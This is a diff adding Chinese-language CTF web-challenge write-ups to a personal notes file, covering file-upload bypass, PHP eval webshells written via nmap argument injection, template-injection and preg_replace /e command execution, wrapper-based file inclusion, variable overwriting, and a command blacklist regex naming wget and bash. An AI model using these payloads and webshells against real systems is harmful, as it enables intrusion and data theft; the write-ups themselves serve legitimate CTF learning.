@@ -2529,7 +2529,7 @@ flag.php文件的内容就在the contents of his/her blog中，打开源码
 
 ![image-20210516191332950](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516191332950.png)
 
-### “百度杯”CTF比赛 十二月场——notebook
+### “百度杯”CTF比赛 十二月场——notebook（未解决）
 
 ![image-20210516193110579](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210516193110579.png)
 
@@ -2889,8 +2889,470 @@ if(!isset($_GET['host'])) {
 
 https://blog.csdn.net/qq_26406447/article/details/100711933
 
+[PHP escapeshellarg()+escapeshellcmd() 之殇 (seebug.org)](https://paper.seebug.org/164/)
+
 ```
 ?host=' <?php @eval($_POST["hack"]);?> -oG hack.php '
 ?host=\' <?php @eval($_POST["hack"]);?> -oG hack.php \' //escapeshellarg()执行
 ```
 
+### [GXYCTF2019]BabyUpload
+
+![image-20210521205039601](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521205039601.png)
+
+![image-20210521205048515](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521205048515.png)
+
+上传 `.htaccess`和 `.png`文件即可，并且用长语法PHP代码绕过限制，用蚁剑连接即可。
+
+![image-20210521205209107](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521205209107.png)
+
+### [强网杯 2019]高明的黑客
+
+![image-20210521205411113](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521205411113.png)
+
+下载完成之后，解压文件后发现，文件夹中的所有文件名字和文件中的内容都被编码了，看来需要写个脚本还原一下文件名
+
+![image-20210521205508938](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521205508938.png)
+
+![image-20210521205547451](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521205547451.png)
+
+不是base64、base32编码，不是md5和rot13。好像并不能还原这些编码，并且这些编码后的代码也能正确执行，看了别人的WP，写python脚本来找含有shell漏洞的PHP文件。
+
+~~~python
+import os
+import requests
+import re
+import threading
+import time
+print('start：  '+  time.asctime( time.localtime(time.time()) ))
+s1=threading.Semaphore(100)
+filePath = r"D:\phpstudy\phpstudy_pro\WWW\src"
+os.chdir(filePath)
+requests.adapters.DEFAULT_RETRIES = 5
+files = os.listdir(filePath)
+session = requests.Session()
+session.keep_alive = False
+def get_content(file):
+    s1.acquire()
+    print('trying   '+file+ '     '+ time.asctime( time.localtime(time.time()) ))
+    with open(file,encoding='utf-8') as f:
+            gets = list(re.findall('\$_GET\[\'(.*?)\'\]', f.read()))
+            posts = list(re.findall('\$_POST\[\'(.*?)\'\]', f.read()))
+    data = {}
+    params = {}
+    for m in gets: #遍历所有含有$_GET()方法的
+        params[m] = "echo 'aaa';"
+    for n in posts:
+        data[n] = "echo 'aaa';"
+    url = 'http://127.0.0.1/src/'+file
+    req = session.post(url, data=data, params=params)
+    req.close()
+    req.encoding = 'utf-8'
+    content = req.text
+    # print(content)
+    if "aaa" in content:
+        flag = 0
+        for a in gets:
+            req = session.get(url+'?%s='%a+"echo '111';")
+            content = req.text
+            req.close()
+            if "111" in content:
+                flag = 1
+                break
+        if flag != 1:
+            for b in posts:
+                req = session.post(url, data={b:"echo '222';"})
+                content = req.text
+                req.close()
+                if "222" in content:
+                    break
+        if flag == 1:
+            param = a
+        else:
+            param = b
+        print('file: '+file+"  and param:%s" %param)
+        print('endtime: ' + time.asctime(time.localtime(time.time())))
+    s1.release()
+
+for i in files:
+    t = threading.Thread(target=get_content, args=(i,))
+    t.start()
+
+
+~~~
+
+![image-20210521215022951](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521215022951.png)
+
+https://www.zhaoj.in/read-5873.html#0x02
+
+![image-20210521222210419](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521222210419.png)
+
+### [GXYCTF2019]禁止套娃
+
+![image-20210522155734364](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522155734364.png)
+
+注释没有什么东西，抓包和扫描目录，看看能发现什么东西？
+
+扫描出.git
+
+![image-20210522161120494](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522161120494.png)
+
+~~~php
+<?php
+include "flag.php";
+echo "flag在哪里呢？<br>";
+if(isset($_GET['exp'])){
+    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
+        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
+            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
+                // echo $_GET['exp'];
+                @eval($_GET['exp']);
+            }
+            else{
+                die("还差一点哦！");
+            }
+        }
+        else{
+            die("再好好想想！");
+        }
+    }
+    else{
+        die("还想读flag，臭弟弟！");
+    }
+}
+// highlight_file(__FILE__);
+?>
+
+~~~
+
+> localeconv() 函数返回一包含本地数字及货币格式信息的数组。
+> scandir() 列出 images 目录中的文件和目录。
+> readfile() 输出一个文件。
+> current() 返回数组中的当前单元, 默认取第一个值。
+> pos()是 current() 的别名。
+> next() 函数将内部指针指向数组中的下一个元素，并输出。
+> array_reverse()以相反的元素顺序返回数组。
+> highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。
+
+https://www.cnblogs.com/wangtanzhi/p/12260986.html
+
+
+
+payload:
+
+~~~
+?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));
+~~~
+
+![image-20210522164917590](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522164917590.png)
+
+或者
+
+![image-20210522165838223](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522165838223.png)
+
+
+
+
+
+### [GWCTF 2019]我有一个数据库
+
+![image-20210522172659715](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522172659715.png)
+
+
+
+
+
+### [RoarCTF 2019]Easy Java
+
+~~~
+WEB-INF主要包含一下文件或目录:
+/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
+/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
+/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
+/WEB-INF/database.properties：数据库配置文件
+漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码
+~~~
+
+### [BJDCTF2020]The mystery of ip
+
+hint.php源代码
+
+![image-20210522200551504](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522200551504.png)
+
+flag.php,显示了本机的外网地址
+
+![image-20210522200752779](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522200752779.png)
+
+修改一下数据包client-ip或者XFF字段，成功修改了显示的ip地址
+
+![image-20210522200928089](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522200928089.png)
+
+猜测一下PHP代码中有获取ip地址的代码，试试存在SQL注入吗？好像不存在
+
+看看别人的WP，存在SSTI
+
+![image-20210522201647861](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522201647861.png)
+
+
+
+![image-20210522202112920](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522202112920.png)
+
+成功执行phpinfo()信息
+
+用同样的方法可以轻松获得flag：
+
+payload：
+
+~~~
+{if system("ls /")}{/if}或者{system("ls /")}
+{if system("cat /flag")}{/if}或者{system("cat /flag")}
+~~~
+
+![image-20210522202301199](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522202301199.png)
+
+![image-20210522202331777](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522202331777.png)
+
+https://blog.csdn.net/qq_45521281/article/details/107556915
+
+### [BJDCTF2020]ZJCTF，不过如此
+
+直接代码审计
+
+~~~php
+<?php
+
+error_reporting(0);
+$text = $_GET["text"];
+$file = $_GET["file"];
+if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){//使用data伪协议添加内容
+    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+    if(preg_match("/flag/",$file)){
+        die("Not now!");
+    }
+
+    include($file);  //next.php
+    //使用php://filter协议查看php文件的源码
+}
+else{
+    highlight_file(__FILE__);
+}
+?>
+~~~
+
+利用上述代码的payload，其中用到了的远程文件包含中的两个伪协议
+
+~~~
+?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&file=php://filter/convert.base64-encode/resource=next.php
+~~~
+
+
+
+![image-20210522203713505](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522203713505.png)
+
+结果base64解码：
+
+~~~php
+<?php
+$id = $_GET['id'];
+$_SESSION['id'] = $id;
+
+function complex($re, $str) {
+    return preg_replace(
+        '/(' . $re . ')/ei',//两边添加了圆括号
+        'strtolower("\\1")',
+        $str
+    );
+}
+
+
+foreach($_GET as $re => $str) {
+    echo complex($re, $str). "\n";
+}
+
+function getFlag(){
+	@eval($_GET['cmd']);
+}
+
+~~~
+
+没看懂complex函数的功能，看看别人的WP
+
+**preg_replace**
+
+`preg_replace(pattern, replacement, subject)`
+
+ 当pattern传入的正则表达式带有`/e`时，存在命令执行，即当匹配到符合正则表达式的字符串时，第二个参数的字符串可被当做代码来执行。
+这里第二个参数固定为strtolower("\\1")
+这里的\\\1实际上体现为\1
+
+>  反向引用
+对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 '\n' 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。
+
+payload:
+
+~~~
+///next.php?\S*=${getFlag()}&cmd=system('cat /flag');
+~~~
+
+### [BJDCTF2020]Mark loves  cat
+
+存在.git泄露
+
+![image-20210523140600446](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210523140600446.png)
+
+获得index.php，下面是php代码片段：
+
+~~~php
+<?php
+
+include 'flag.php';
+
+$yds = "dog";
+$is = "cat";
+$handsome = 'yds';
+
+foreach($_POST as $x => $y){ //?a=ljw-->$x=a;$y=ljw;
+    $$x = $y;		//$a=ljw
+}
+
+foreach($_GET as $x => $y){	//?a=ljw-->$x=a;$y=ljw;
+    $$x = $$y;				//$a=$ljw;
+}
+
+foreach($_GET as $x => $y){
+    if($_GET['flag'] === $x && $x !== 'flag'){
+        exit($handsome);
+    }
+}
+
+if(!isset($_GET['flag']) && !isset($_POST['flag'])){
+    exit($yds);
+}
+
+if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
+    exit($is);
+}
+echo "the flag is: ".$flag; 
+?>
+~~~
+
+代码的意思好像是会覆盖`$flag`变量，这样就不会执行flag.php文件中的$flag，我们要想办法绕过代码中的限制。
+
+使用变量覆盖，可以用$flag的值覆盖$yds或者$is,并对应执行exit($yds)或者exit($is)
+
+第一种方法：执行 exit($yds)
+
+~~~
+if(!isset($_GET['flag']) && !isset($_POST['flag'])){
+    exit($yds);
+}
+~~~
+
+只要传输的变量名不是flag就会执行，可以直接用get方法传递参数：`yds=flag`，这个参数经过执行 $$x = $$y;就会变成$yds=$flag，这样$flag值就会覆盖$yds，并且也不符合`if(!isset($_GET['flag']) && !isset($_POST['flag']))`，成功执行exit($flag)
+
+第二种方法：exit($is)
+
+~~~
+if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
+    exit($is);
+}
+~~~
+
+如果传输的变量存在flag===flag就会执行，要把$is变量覆盖为$flag
+
+首先要get方法传输is=flag --> $is=$flag   
+
+还要符合 `if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag')`就要用get方法传递flag=flag   -->$flag=$flag(没变化，还是在flag.php中获取值)
+
+组合payload：is=flag&flag=flag  -->$is=$flag&$flag=$flag
+
+![image-20210523145203792](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210523145203792.png)
+
+![image-20210523145237567](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210523145237567.png)
+
+这两种方法都成功获得flag值
+
+### [安洵杯 2019]easy_web
+
+
+
+![image-20210523150024399](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210523150024399.png)
+
+在源码中发现了，估计后面会用到md5
+
+![image-20210523150051515](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210523150051515.png)
+
+![image-20210523151040382](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210523151040382.png)
+
+常用命令被禁止了
+
+img的值经过base64解密-->base64解密-->hex得到图片名为555.png
+
+然后可以使用这种办法获得index的源码   hex-->base64加密-->base64加密
+![image-20210523153516965](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210523153516965.png)
+
+~~~php
+<?php
+error_reporting(E_ALL || ~ E_NOTICE);
+header('content-type:text/html;charset=utf-8');
+$cmd = $_GET['cmd'];
+if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
+    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
+$file = hex2bin(base64_decode(base64_decode($_GET['img'])));
+
+$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
+if (preg_match("/flag/i", $file)) {
+    echo '<img src ="./ctf3.jpeg">';
+    die("xixiï½ no flag");
+} else {
+    $txt = base64_encode(file_get_contents($file));
+    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
+    echo "<br>";
+}
+echo $cmd;
+echo "<br>";
+if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) { //常用命令都被禁止了
+    echo("forbid ~");
+    echo "<br>";
+} else {
+    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) { //这里存在绕过，使用MD5强碰撞
+        echo `$cmd`; //``符号是执行运算符，使用反引号运算符“`”的效果与函数 shell_exec() 相同。
+    } else {
+        echo ("md5 is funny ~");
+    }
+}
+
+?>
+<html>
+<style>
+  body{
+   background:url(./bj.png)  no-repeat center center;
+   background-size:cover;
+   background-attachment:fixed;
+   background-color:#CCCCCC;
+}
+</style>
+<body>
+</body>
+</html>
+~~~
+
+[浅谈md5弱类型比较和强碰撞](https://www.secpulse.com/archives/153442.html)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+![image-20210523161315667](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210523161315667.png)
